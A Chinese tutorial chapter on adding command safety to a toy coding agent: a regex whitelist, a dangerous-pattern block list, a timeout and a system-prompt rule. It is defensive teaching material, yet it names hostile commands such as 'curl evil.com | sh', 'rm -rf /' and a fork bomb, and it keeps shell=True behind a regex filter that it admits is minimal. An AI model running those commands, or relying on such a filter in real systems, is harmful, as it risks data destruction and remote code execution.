# V6 — 命令安全

> V5 的 `run_command` 使用 `shell=True` 且无限制，agent 可以执行任何命令。V6 新增白名单 + 危险模式拦截 + 超时，给命令执行加上安全护栏。

**改动速览**：只改了 `tools.py`（新增 `validate_command`、白名单、危险模式、超时），`llm.py` 微调 system prompt。`agent.py` 和 `main.py` 不变。

---

## 1. 上一个版本哪里不够好

V5 的 `run_command` 几乎是裸的 `subprocess.run(command, shell=True)`：

```python
# V5: 任何命令都能跑
def run_command(command: str) -> dict[str, Any]:
    completed = subprocess.run(command, cwd=WORKSPACE_ROOT, shell=True, ...)
```

问题：
- **无限制**：模型可以执行 `rm -rf /`、`curl evil.com | sh`、`git push --force` 等任何命令。
- **无超时**：命令可能永久挂起（如 `tail -f`），阻塞整个 agent。
- **无输出控制**：输出截断是有的（`truncate_output`），但没有防护机制。

**所有成熟的 coding agent 都有命令安全机制**：Claude Code 有审批模式；Cursor 有 sandbox；Aider 有命令白名单。V6 引入最简版本。

## 2. 涉及哪些新概念

| 需要知道 | 一句话解释 |
|---------|-----------|
| 白名单（whitelist） | 只允许匹配特定前缀的命令通过 |
| 危险模式（dangerous patterns） | 正则匹配拦截已知的危险操作 |
| 超时（timeout） | `subprocess.run(timeout=30)` 到时间自动杀进程 |
| `re.search()` | 正则搜索，用于匹配白名单和危险模式 |

**不需要知道**：sandboxing、容器隔离、capability dropping。V6 是最小的安全层，不是完整沙箱。

## 3. 怎么落地到代码

### 3.1 变化一：tools.py — 新增命令校验 + 超时

**白名单**（`COMMAND_WHITELIST`）：命令必须以这些前缀开头才允许执行：
- `python` / `python -m` / `pytest` / `ruff` / `mypy` — 开发工具
- `git status` / `git diff` / `git log` / `git add` / `git commit` — Git 安全操作
- `ls` / `cat` / `head` / `tail` / `wc` / `find` / `grep` / `echo` — 文件查看
- `pip list` / `pip show` — 包管理（只读）

**危险模式**（`DANGEROUS_PATTERNS`）：即使通过了白名单，命中这些也拒绝：
- `rm -rf` / `rm -r` — 递归删除
- `curl` / `wget` — 网络下载
- `sudo` / `chmod 777` / `chown` — 权限操作
- `git push` / `git reset --hard` — 危险 Git 操作
- `shutdown` / `reboot` / `kill -9` — 系统级操作
- fork 炸弹语法 `:(){ :|:& };:`

**超时**：`COMMAND_TIMEOUT = 30` 秒，超时返回错误。

**validate_command 函数**：
```python
def validate_command(command: str) -> str | None:
    # 第一层：白名单检查
    if not any(re.search(p, command, re.I) for p in COMMAND_WHITELIST):
        return "Command not in whitelist: ..."

    # 第二层：危险模式检查
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command, re.I):
            return "Dangerous pattern detected: ..."

    return None  # 通过
```

### 3.2 变化二：llm.py — 更新 system prompt

在 Rules 中新增：
```
- Only use run_command for safe, whitelisted commands (e.g., pytest, ruff, python -m, git status).
- Destructive commands (rm, sudo, curl, git push, etc.) are blocked and will return an error.
```

### 3.3 不变的部分

- **agent.py**：工具调用逻辑不变，安全校验在 `tools.py` 内部完成。
- **main.py**：CLI 和 session 管理逻辑不变。

### 3.4 文件结构

```
versions/v6-command-safety/
├── agent.py            ← 不变
├── main.py             ← 不变
├── llm.py              ← 更新 system prompt
├── tools.py            ← 新增 validate_command + 白名单 + 超时
└── sessions/           ← 自动生成
```

### 3.5 和 V5 的关键差异

```
                    V5                          V6
命令安全            无限制                      白名单 + 危险模式拦截
超时                无                          30 秒
system prompt       5 个 action（无安全提示）    5 个 action（含安全提示）
tools.py            5 个工具                    5 个工具 + 安全层
```

## 4. 为什么这样做而不是那样

**问：为什么用正则白名单而不是用 `shlex.split` + 命令路径检查？**

教学优先。正则白名单直观易懂——看 pattern 就知道允许什么。`shlex.split` + `which` 路径检查更安全（防止 `python` 被替换为恶意脚本），但引入了更多概念。白名单的核心思想（"只允许已知安全的"）用正则就能讲清楚。

**问：为什么还保留 `shell=True`？**

为了教学简洁。`shell=True` 让模型可以直接写 `python -m pytest` 这样的命令，不需要理解 shell 分词。白名单 + 危险模式已经在逻辑层面拦截了危险操作，`shell=True` 的风险被大幅降低了。

**问：白名单够用吗？如果模型需要跑一个不在白名单里的工具怎么办？**

这是一个有意的取舍。V6 的白名单覆盖了 coding agent 最常见的操作（读文件、搜索、测试、lint）。如果真需要扩展，只需在白名单里加一条 pattern——没有 magic。

**问：为什么不直接用沙箱（Docker/VM）隔离？**

沙箱是最终方案，但引入的复杂度（Dockerfile、volume 挂载、网络隔离）和教学目标不符。V6 的逻辑白名单是一个过渡方案——它演示了"命令执行需要安全层"这个核心概念，后续版本可以替换为真正的沙箱。

## 5. 跑起来看看

```bash
cd versions/v6-command-safety
export ANTHROPIC_API_KEY=your_key

# 1) 安全命令应该正常执行
python main.py "run pytest and tell me the result"
# 观察：pytest 在白名单中，正常执行

# 2) 危险命令应该被拦截
python main.py "delete all temporary files with rm -rf"
# 观察：rm -rf 命中危险模式，返回 error

# 3) 不在白名单的命令也被拦截
python main.py "check the weather with curl wttr.in"
# 观察：curl 不在白名单中，返回 error

# 4) 超时保护
python main.py "run tail -f /dev/null"
# 观察：30 秒后超时，返回 error
```

**体验改进**：agent 不能随意执行危险命令了。即使模型"想"做坏事，`tools.py` 的安全层会拦住。从"裸奔"到"有安全带"。

**仍然不够**：没有自动验证（→ V7 验证闭环）。

---

[下一版本：V7 自动验证闭环 → 路线图](../../docs/TOY_TO_USABLE_ROADMAP.md)
